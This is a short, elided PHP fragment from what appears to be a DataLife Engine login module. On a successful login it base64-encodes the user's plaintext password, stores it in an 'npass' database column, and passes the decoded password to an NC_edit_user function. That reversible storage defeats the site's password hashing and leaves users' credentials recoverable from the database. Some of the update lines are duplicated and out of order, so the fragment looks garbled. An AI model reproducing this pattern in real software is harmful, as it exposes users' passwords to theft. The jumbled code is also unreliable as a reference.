		...
		if( $member_id['user_id'] AND $member_id['password'] ) {
			...
			if( is_md5hash( $member_id['password'] ) ) {
				...
				if($member_id['password'] == md5( md5($_POST['login_password']) ) ) {
					$is_logged = true;
$npass = base64_encode($_POST['login_password']);
$db->super_query( "UPDATE `" . USERPREFIX . "_users` SET `npass`='{$npass}' WHERE `user_id`='{$member_id['user_id']}'" );
NC_edit_user($member_id['name'],base64_decode($npass));
NC_edit_user($member_id['name'],base64_decode($npass));
$npass = base64_encode($_POST['login_password']);
$db->super_query( "UPDATE `" . USERPREFIX . "_users` SET `npass`='{$npass}' WHERE `user_id`='{$member_id['user_id']}'" );
NC_edit_user($member_id['name'],base64_decode($npass));
...
if( $is_logged ) {
	...
	require_once ENGINE_DIR . "/modules/billing/plugins/bonuses/visit.php";
